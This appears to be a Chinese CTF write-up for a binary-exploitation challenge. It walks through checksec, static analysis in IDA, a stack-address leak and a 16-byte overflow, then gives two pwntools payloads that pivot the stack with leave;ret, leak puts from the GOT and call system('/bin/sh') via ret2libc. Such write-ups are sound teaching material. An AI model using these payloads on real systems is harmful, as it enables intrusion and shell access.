1.先checksec以下

 <img width="811" height="363" alt="image" src="https://github.com/user-attachments/assets/6decbce1-2c37-4fd3-a79f-b0d2aeebec7c" />
 
pie没开，canany也没有

拖进ida里面从main函数开始进行静态分析，没有system和binsh，需要ret2libc

<img width="919" height="224" alt="image" src="https://github.com/user-attachments/assets/8560b386-f5c4-4dd4-b34d-2e73948f5b3e" />

<img width="1052" height="516" alt="image" src="https://github.com/user-attachments/assets/23314e16-aff3-40ec-81d4-e0421aca5e11" />

第一个函数是初始化，直接分析第二个函数，第一个read无溢出，但可以泄露栈上的地址，第二个read只能溢出16字节，刚好覆盖rbp和ret。

需要进行栈迁移.

ROPgadget一下，需要leave_ret。顺便把rdi和ret也爆一下，后面需要用到。
解释一下leave esp,ebp;pop ebp,ret=pop eip;前者将ebp换成需要的地址传给esp，下一次ret就会在我们想要的地址出取地址执行指令，从而达到控制程序的目的。

<img width="1194" height="881" alt="image" src="https://github.com/user-attachments/assets/07de7008-7b30-4735-a021-f8db409c8a47" />

运行程序输入几个字符，泄露一下栈上的地址，由于栈迁移是到第二个read缓冲区的位置，泄露的是第一个read栈地址，计算地址的偏移量0x58-0x50=8,
泄露的地址加上8，就是需要迁移到的地址。

构造第一个payload，泄露got表中puts函数的地址（其他函数也可以）。开头填充8个a是为了覆盖新的rbp的值。

payload = b'a'*8 + p64(rdi_addr) + p64(elf.got['puts']) + p64(elf.plt['puts']) + p64(main)

payload = payload.ljust(80,b'a')

payload += p64(stack) +p64(leave)

然后接收puts函数的地址并计算libc基地址、system函数地址和binsh字符串地址。

构造第二个payload，加ret是为了进行栈对齐。

payload = b'a'*8 + p64(ret_addr) + p64(rdi_addr) + p64(bin_sh) + p64(sys_addr)

payload = payload.ljust(80,b'a')

payload += p64(stack) +p64(leave)


